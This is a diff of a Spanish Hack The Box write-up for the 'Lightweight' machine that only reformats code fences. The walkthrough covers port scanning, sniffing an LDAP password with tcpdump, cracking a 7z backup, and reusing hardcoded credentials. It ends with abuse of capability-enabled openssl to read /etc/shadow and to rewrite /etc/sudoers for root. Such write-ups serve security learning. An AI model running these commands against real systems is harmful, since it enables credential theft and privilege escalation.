@@ -27,7 +27,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~#  nmap -sS -p- --open -v -n 10.10.10.119
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-23 22:42 CST
 Initiating Ping Scan at 22:42
@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 772.33 seconds
 
 Continuemos con el doblecheck usando `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.119
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-15 06:33:48 GMT
@@ -83,7 +83,7 @@ Como podemos ver, los puertos corresponden entre si, por lo que continuamos con 
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sC -sV -p80,22,389 -n -v --open 10.10.10.119
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 22:45 CDT
 NSE: Loaded 148 scripts for scanning.
@@ -151,7 +151,7 @@ Nmap done: 1 IP address (1 host up) scanned in 81.12 seconds
 
 # Enum of tcp/389 (ldap)
 
-```text
+``` text
 xbytemx@laptop:~/htb/lightweight$ nmap --script ldap-search -p389 10.10.10.119
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-05 19:12 CST
 Nmap scan report for 10.10.10.119
@@ -237,7 +237,7 @@ Por los resultados podemos observar dos usuarios locales, ldapuser1 y ldapuser2.
 
 # Enum tcp/80 (http)
 
-```html
+``` html
 xbytemx@laptop:~/htb/lightweight$ http 10.10.10.119
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -351,7 +351,7 @@ Exploremos uno por uno para ver que encontramos.
 
 ![info](/img/htb-lightweight/www-info.png)
 
-```html
+``` html
 HTTP/1.1 200 OK
 Connection: Keep-Alive
 Content-Length: 1727
@@ -404,7 +404,7 @@ Info presenta unos mensajes bastante comunicativos. Nos indican que si realizamo
 
 ![user](/img/htb-lightweight/www-user.png)
 
-```html
+``` html
 HTTP/1.1 200 OK
 Connection: Keep-Alive
 Content-Length: 1495
@@ -454,7 +454,7 @@ También aparece un nuevo enlace, el de reset.php. Este enlace nos sirve para ej
 
 ![status](/img/htb-lightweight/www-status.png)
 
-```html
+``` html
 xbytemx@laptop:~/htb/lightweight$ http http://10.10.10.119/status.php
 HTTP/1.1 200 OK
 Connection: Keep-Alive
@@ -510,7 +510,7 @@ Ahora, entremos por SSH a la maquina para seguir investigando.
 
 Después de usar a user.php, entramos directamente a la maquina solo para encontrarnos que no hay nada realmente útil:
 
-```text
+``` text
 xbytemx@laptop:~/htb/lightweight$ ssh 10.10.14.36@10.10.10.119
 10.10.14.36@10.10.10.119's password:
 [10.10.14.36@lightweight ~]$
@@ -542,7 +542,7 @@ Seguí investigando pero no encontré nada realmente de valor hasta que recibí 
 
 Después de entender eso y probar varios filtros, logre capturar lo siguiente mientras visitaba status.php (por cierto, esta pagina me dio mala espina desde que era la única que tardaba mucho, como si de alguna tarea se tratase):
 
-```text
+``` text
 [10.10.14.151@lightweight ~]$ tcpdump -i any -XX -vv 'tcp port 389'
 tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
 00:07:07.973705 IP (tos 0x0, ttl 64, id 49718, offset 0, flags [DF], proto TCP (6), length 60)
@@ -645,7 +645,7 @@ tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 2621
 
 Lo que logramos capturar fue bind login de LDAP. Al inicio creí que le había enviado un hash a la aplicación y perdí un buen rato tratando de romper el hash. Al final me di cuenta que como va a enviar un hash si se trata de ldap local... pero bueno, trate de hacer loggearme vía `su -` y funciono como era esperado:
 
-```text
+``` text
 [10.10.14.36@lightweight ~]$ su - ldapuser2
 Contraseña:
 Último inicio de sesión:vie nov 16 22:41:31 GMT 2018en pts/0
@@ -676,7 +676,7 @@ Esta ya se la saben, solo hagan `cat user.txt`.
 
 Una vez que entremos como ldapuser2, veremos que hay un archivo muy sospechoso llamada _backup.7z_. Analicemos fuera de la maquina este archivo. Para ello y para mi gusto, exportare el archivo via base64:
 
-```text
+``` text
 [ldapuser2@lightweight ~]$ file backup.7z
 backup.7z: 7-zip archive data, version 0.4
 [ldapuser2@lightweight ~]$ base64 backup.7z
@@ -744,20 +744,20 @@ WwZioJpI7t/uAAAAABcGjFABCYDAAAcLAQABIwMBAQVdABAAAAyBCgoBPiBwEwAA
 
 Este machote de b64, lo grabamos como `backup.7z.b64` y lo reencodeamos localmente:
 
-```text
+``` text
 xbytemx@laptop:~/htb/lightweight$ cat backup.7z.b64 | base64 -d > backup2.7z
 ```
 
 Como era de esperarse, el archivo `backup.7z` tiene password. Pero no hay problema, yo tengo un amigo que sabe romper contraseñas, se llama john:
 
-```text
+``` text
 xbytemx@laptop:~/htb/lightweight$ ~/git/JohnTheRipper/run/7z2john.pl backup2.7z | tee 7z.hash
 backup2.7z:$7z$2$19$0$$8$11e96ba400e3926d0000000000000000$1800843918$3152$3140$1ed4a64a2e9a8bc76c59d8160d3bc3bbfd995ce02cf430ea41949ff4d745f6bf3ed238e9f06e98da3446dda53df0abf11902852e4b2a4e32e0b0f12b33af40d351b2140d6266db1a3d66e1c82fa9d516556ec893ba6841f052618ad210593b9975307b98db7e853e3ebfbef6856039647a6ad33a63f5b268fc003c39eba04484beff73264ff8c8fdb8e3bcc94ee0df4feacbba388536663f8feb8b1454890752fba4a7fba484cfd6d1d050aa6233478a2c425566d60630d985d15dae09c7485f92ea271d2087ac837b6f9101465cf4a62b0ee225245871655b1aa16526a2a5d61ab942d1418900fec9da5771da34cb8bf56ec7f05a75cf26a0202a7065b8b020769d244d95e3166fdb9f4557324e090307e91bc7adc7f56f5215ffd1463c7403c5725cbf006b46882439d629a14d4a1e25fafb202a1cfbac837eabf002f7ebfc87f20c67ff847c393a54e5724c29840016fa76be0dfbb73a79fb2ec3f0e9c7b246525acad50d76c3fe31d75004e5bc3e93ce79aab2ddbc91c7ce9666503e3ab8dcaf269d4554baee5276c516d23fabf41610ff4f666ad5cf9dc6dc3bed7e1c0a2767f018ca3cd15a35a1fbefce479b649a5db00263b55c470fcb049327e7aeb849359a74a2444de7a3c025b3a9dbfd597e0cdf642c340982b650d69f2c48b1e6b823b460734f3c6f3c1e3917b6780b0efda60ce5b7d03d55ff1fa0a161b9aa876b7498c8104f28ca6c6c629d6ca47c18e54bb237b62bd813d1cd47fdcd87b9597ddf14aec439185f8b892dedb4bcae949dbab74d72cd45dda311e0f38f219a1887bede5ec6697a8ab9f5cec687e18fd6ef2223015a3d717830f0aff0664e66ed51d185e965b55ce702135eb57f5efca251238f8e66f828c3d28d961dd09f244e735419273700e5ce97b4fa9ee3d5b45f8b81c9d5af1436e70f75dc9657354807bcadcdcf1e4f9432b29d55c21b59de59c933d0d96b0f3b89f871c14691faa63db3bdde5ca78f2c470839d49690d82f5c8334d9a857af449b1cd4c140b1087f41d09fb46baf5f0e7228716f992635e99861621d0e99d9d649ad863d99adab4ba060ef19b18a3dc2c64815401867c852ea17b01a5c551249cef2a234a1d0a91be047e06678a35ebe7256cca9791590bbfc37ee200d173f1c87a585003920ff52fc38f74da83c18284dbf171eda45fb0cba8d3ed09fc9d9e951ff95ae8b3326ec4d2cf6eaaca2890464a424f79718f044b6b7903c0f512744332f615f81e7a965df81f78ae950b98df910660b4c85bbee5b6b9b4eb061868530d1dee292296ac18e0f3081048834129583b2a7fa88573039ec01657642450688464a2e9db9bf9483d105875a30d855fe6c657a81ce5242a2a99887bdc1c786b57916b03a0d3cdddec1a0a8f94e6d9926ebf534a5b28fc4a4e16956941a5eb8718dbca21d9464a4a970b77a5967483f1373c4dc04967b16164d9d9ef6824acfcb63e20913234712b7abbc82f562aea65ef39d2bef6608d887cd5ff67966967a568a3dc21f28ad393d2ab3ca85ff7b87eebd97f80d878e616121bb94020c6fb80f3780c41dba3b4c4c3fceeba9748f4d9a47d3454b491b95bafddefd04afc8b1922e4a87534539d391fb948b59fcc1f5072c0af3c29afbbec26e2dfd7fc6d4e3a19fdb37cd49342bc7ec7526b6594295b341fe6a1a2a5f399eadade6dcb84d87fd3b00a9b79ef6c11cc01f5958a43fbdd2602eb10b4ddaa327ac043ee01c470d3ed2519488e80183043f41968f32283577cb5615de2416fcb9a74b1ce282614f818bc5adef0cb1dd6eb98d74a8d8214ec2a361b246bad656b487e8dce40f4fef808ad818c06ef5a972e2614e51e6b040f491a92ff39d55408cf92ccc0f797f27d8c1f7c5004b5613a660b6f306ba447bb99bbe5a408d00eb2dd4127351097f204e9d277a5eb97330a3d3409c7e097a18639542b1c9efe35eda1b12c1346bc8816a0430f5668a38735567ba09580504de831bb639ab1de7d2afcf2e470cbded2960f3300aca88446ccf0fa27715666e4eb45fe5d6a7a46c414d61e5fbbfd384c53e8bac6805083164332c2bd79d05c4d10436377a35b8402e186efd8959131437840c7b010d7ce74423e08bea80639414dbd0c290ced5bb1adf597b7a76141cc15d3d3054bcc4e9df234be4187725576645e86e0cfb9b7769a8cdefbec5b08d4feda04e8fd437631e181ac89deec9c54105a32776a2cb8f068177aabc375359e5b38ae4eb8cebf0668f5d104a5c5929c890c7d1de0694063943b844cd8f274b6f6bcbe004b3fe54e52905200e5b024a02498a1f767758e910516c7c295a552802e47d699cdd98adea07bd4f53f745342b990067339b9a0a2ab0c6ea2c0210961b96c7c22b2daaa322de7fddc91527d118c45d4a2a08a2c37a85a7b665ab4ba625b983019085b32096c78ed8a760c83fbf6c5811b7b16681b0a61513686d6810c72d0f1c30b792b1948a478ad660a4036fcd5dbfc57b352a22a4ed27daf1f8455aa9d81a5b8b28287fea4342c14bd42cf3159c830d322d166958a6e233ca7b9dd2914fce1f2621f95998e83df69bee22f70ae086f242690631fcd33730bb2e5ad64fa7d0b7b93931957311eeaa9b45382d020e85856e456712da51a9c220226d2a177e758ea6b7631647cc8419d04fb6b5dab40a841ba9d5660a550ac817af679f3c1a266b9c657372988ab38cfb6971695c59b5454fdf7ca1170066b99c06c985fb8564eed4caade040ef9320d5198041a2bfc62b4b21eb080520628ed3c8c8a2ffd8e0073b24c2059815da86f1b682622e714124950ff26ad79bf31897331fc23cd075fb1f4822046273b0898bebc1ba23110d74ed459c0c0f12488f0b51310f59c9dae537cdda5a75d48a4ac544531fba92fd6dbaa018cb3cc69ee4b9859f3fa1e022d4850bfd995afa9d70273789084f5955a30df3cf7de7f45c2601fe1ee0adbc89dbbd1aa23badcdfcc9d95e2bfd6f102c92bd1fb9648f446a98ab16302049f6862a0da1c758d0f0a7763e9ac0cdda94bed47f98103f8e068cd12bc83bb9a2bd2be19593d64a2f1034cdad6fbee498488a5b37efebcfe667393cf91c1a4d00082ea8463d57e691a0fb3b2394090dab00bb00d27b418b0db0171da74b6d314b78d951ec5ec87eff81800a0f41bb5eb01d5d116183667e1762c4a1d19631c05a61e1be0f05e5188da27df1a0d8697119fbe29693d776ce50c7896a3bc52888ebdcec056a4d7e675af2ea8de25f52e0470e053dd6614b3548ad0cd282a76d397b7e2fedc98d975003bd29feebc53ee5b412088599ac203cb8b6be1f3a0414511391b3495d175b3dfda7990753255ff0f13eb86ce97b5c6925aa31868523c325548720179c69e0e8df8407f5e87f263acd024cc5c4f5a75ef7a6fc1a3b650257fca20aa00674f35a07dac72471bbb500152b51dfe1743b797ad61110aa76b9fe69c0a02506ba4a6fc0b4a202efb9d88dfba38e5b5352046022cc17b57bdb40153db6b97e2f344d2c4598c0d021044eeb01423f6f6ade5702e10b63782fedddbaeba1dd9f9725eb3f85584fce2319b24851d7ec3ba2c2774741683b383ec97aadb7c912d655b6e5b147c33bb1856623b8ca08f092c0677d56e1dde99aa31ab30a654c57828536a120b4e4835ca6c7b5a2243bddfb9a00750521c74654a281cb12c806437030cd577907a797dc63a3959d47b68119a32a229899be06b7979c14b2c98e75667b8c5d30f0dfedd9553ba894ad9acda62f7f607bb35c080c3a440108ac0ce45f1873c5873488f2901790b08cb4928932a1c479d89ded5f6ce9f16c297e9dcc33c6b882b26c53b7a4f2b390367e36e384c1eb9805c0471aad4f77496e8f4fd447448dd59536629a645d04956fc30bcc686718e8d4d7cfc9ecbef3745af038de55826d328b7bad4a2eb7a10faf09c0618fd90d1941e8e3274bcd6eb2d8bed430ebfe6e8682b60390d79161f3a349c73de552d40f7421e5c4b4de80feb3998eb4ce6ecaef9bd2768e8be6534cd12ac163e70d3ed23963801c04770610c91f1ffcf4cbdf2a733f51e6fd596c855c0b905822a3838a82ea2d0e51dd442c451d05c6aa1b0099883db543927c0cc4016e27bb1b17fe863ae0c18458edbccdd6b15f0b73c3dc8c672c1bbbd81f290e9bb5291192143945d58757f64eceebd88e467d48b54a25cee7ed75263a4bb5d5597b9b5b75b6c254f81871f18246d2d91f664a0f49c1f67940d792d225272e713259f3135e5c286e081b1e2331f9217de1c0c9109d7a898458be85a4c130ea6e8c0db4dc5dbf77da5045f7da647c66e5af5676bb15221d5152da551a9390fda92e3539fde7afbd04e2e710ef28b5d5e50f2fdac106c9a18ef02414fb466f50f52b6e88e336ffe4fa929d9548630f3d7fb7d50ea590b2e3bdc3a88cf9d7f6b30f07d28ddf28c15c5371eb$4218$03
 ```
 
 Listo el paso 1, obtener el hash del archivo 7z. Paso 2, romperla:
 
-```text
+``` text
 xbytemx@laptop:~/htb/lightweight$ ~/git/JohnTheRipper/run/john --wordlist=/home/xbytemx/wl/rockyou.txt 7z.hash
 Warning: detected hash type "7z", but the string is also recognized as "7z-opencl"
 Use the "--format=7z-opencl" option to force loading these as that type instead
@@ -776,7 +776,7 @@ Session completed
 
 Asi que la pass es **delete**. Descomprimamos:
 
-```text
+``` text
 xbytemx@laptop:~/htb/lightweight$ 7z x backup2.7z
 
 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
@@ -806,7 +806,7 @@ Compressed: 3411
 
 Una vez que se descomprime de manera exitosa, veamos cual es el contenido que nos entrego backup:
 
-```text
+``` text
 xbytemx@laptop:~/htb/lightweight$ 7z l -pdelete backup.7z
 Date      Time    Attr         Size   Compressed  Name
 ------------------- ----- ------------ ------------  ------------------------
@@ -824,12 +824,12 @@ Perfecto, ahora podemos cerrar interrogantes al analizar el código de cada arch
 1. index.php: No tiene nada especial que hayamos visto antes.
 2. info.php:
 
-```php
+``` php
 <?php $ip=$_SERVER['REMOTE_ADDR'];?>
 ```
 3. reset.php:
 
-```php
+``` php
 <?
 $ip = $_SERVER['REMOTE_ADDR'];
 file_put_contents("/var/www/html/reset_req", $ip.PHP_EOL, FILE_APPEND | LOCK_EX);
@@ -838,7 +838,7 @@ file_put_contents("/var/www/html/reset_req", $ip.PHP_EOL, FILE_APPEND | LOCK_EX)
 
 4. status.php:
 
-```php
+``` php
 <?php
 $username = 'ldapuser1';
 $password = 'f3ca9d298a553da117442deeb6fa932d';
@@ -884,7 +884,7 @@ if ($bind=ldap_bind($ds, $dn, $password)) {
 
 Nos quedamos con lo que nos entrega status (motivo por el cual tardaba en cargar):
 
-```text
+``` text
 $username = 'ldapuser1';
 $password = 'f3ca9d298a553da117442deeb6fa932d';
 $ldapconfig['host'] = 'lightweight.htb';
@@ -894,7 +894,7 @@ $ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
 
 Si recordamos, esto no es un hash y es una contraseña ya que se usa sobre ldap con bind auth. Probemos nuestras nuevas credenciales:
 
-```text
+``` text
 [10.10.14.151@lightweight ~]$ su - ldapuser1
 Contraseña:
 Último inicio de sesión:mar abr  9 03:10:38 BST 2019en pts/3
@@ -909,7 +909,7 @@ Perfecto, ya tenemos las dos cuentas principales de home.
 
 Ahora que veamos que nos deja ldapuser1:
 
-```text
+``` text
 [ldapuser1@lightweight ~]$ ls -lah
 total 1.6M
 drwx------.  5 ldapuser1 ldapuser1  239 Apr  9 02:06 .
@@ -932,7 +932,7 @@ drwxrw----.  3 ldapuser1 ldapuser1   19 Apr  8 23:26 .pki
 
 Ese archivo capture.pcap suena muy sospechoso, mas por como entramos de unpriv ip user a ldapuser2. Respaldemos los archivos:
 
-```text
+``` text
 [ldapuser1@lightweight ~]$ base64 capture.pcap
 1MOyoQIABAAAAAAAAAAAAP//AAABAAAAeAskWwvrBgBeAAAAXgAAAAAAAAAAAAAAAAAAAIbdYAAA
 AAAoBkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAAAAB5ChyaPWHeRNSkAYUy6e1iAAAAAKACqqpfxQAA
@@ -1122,7 +1122,7 @@ c3RhYmxpc2hlZC4iOwp9Cj8+Cg==
 
 Cuando estuve buscando si mi usuario podía usar tcpdump, me encontré con un tema de getcap interesante, por lo que después cuando `linenum` me dio algunos resultados enseguida lo ejecute de manera recurrente:
 
-```text
+``` text
 [ldapuser1@lightweight /]$ getcap -r / 2>/dev/null
 /usr/bin/ping = cap_net_admin,cap_net_raw+p
 /usr/sbin/mtr = cap_net_raw+ep
@@ -1137,7 +1137,7 @@ Cuando estuve buscando si mi usuario podía usar tcpdump, me encontré con un te
 
 Si prestamos atención y replicamos con LinEnum tenemos:
 
-```text
+``` text
 [+] Files with POSIX capabilities set:
 /usr/bin/ping = cap_net_admin,cap_net_raw+p
 /usr/sbin/mtr = cap_net_raw+ep
@@ -1155,7 +1155,7 @@ https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
 
 Ahí encontraremos que usando openssl con capabilities de EP (like root), podemos leer y editar cualquier archivo. Así que manos a la obra:
 
-```text
+``` text
 [ldapuser1@lightweight ~]$ mkdir /dev/shm/miau
 [ldapuser1@lightweight ~]$ openssl req -x509 -newkey rsa:2048 -keyout /dev/shm/miau/key.pem -out /dev/shm/miau/cert.pem -days 365 -nodes
 Generating a 2048 bit RSA private key
@@ -1181,7 +1181,7 @@ Email Address []:
 
 Certificado listo, ahora toca levantar el servicio de https en un puerto _elite_:
 
-```text
+``` text
 [ldapuser1@lightweight /]$ /home/ldapuser1/openssl s_server -key /dev/shm/miau/key.pem -cert /dev/shm/miau/cert.pem -port 1337 -HTTP &
 [2] 15110
 [ldapuser1@lightweight /]$ Using default temp DH parameters
@@ -1190,7 +1190,7 @@ ACCEPT
 
 Servicio HTTPS listo. Recordemos que el home desde donde se ejecuta este servicio es raíz (/). Probemos con /etc/shadow como dice el articulo:
 
-```text
+``` text
 [ldapuser1@lightweight /]$ curl -k https://127.0.0.1:1337/etc/shadow
 FILE:etc/shadow
 ACCEPT
@@ -1235,7 +1235,7 @@ ldapuser2:$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqyt
 
 Great. Ahora, si en lugar de levantar el servicio usamos el encoder de openssl?
 
-```text
+``` text
 [ldapuser1@lightweight ~]$ ./openssl enc -in /etc/sudoers | grep -vE '^#|^$'
 Defaults   !visiblepw
 Defaults    always_set_home
@@ -1254,14 +1254,14 @@ root	ALL=(ALL) 	ALL
 
 Ahora que hemos visto que podemos leer archivos, también podemos escribir cambiando in por out. Armamos un backup y agregamos a mister ldapuser1:
 
-```
+``` text
 [ldapuser1@lightweight ~]$ ./openssl enc -in /etc/sudoers > /dev/shm/sudoers
 [ldapuser1@lightweight ~]$ (./openssl enc -in /dev/shm/sudoers; printf 'ldapuser1\tALL=(ALL)\tALL\n') | ./openssl enc -out /etc/sudoers
 ```
 
 Ahora solo basta probar:
 
-```text
+``` text
 [ldapuser1@lightweight ~]$ sudo -s
 [sudo] password for ldapuser1:
 [root@lightweight ldapuser1]#
@@ -1271,7 +1271,7 @@ Damm ya tenemos shell de root.
 
 # cat root.txt
 
-```text
+``` text
 [root@lightweight ldapuser1]# cat /root/root.txt
 ```
 
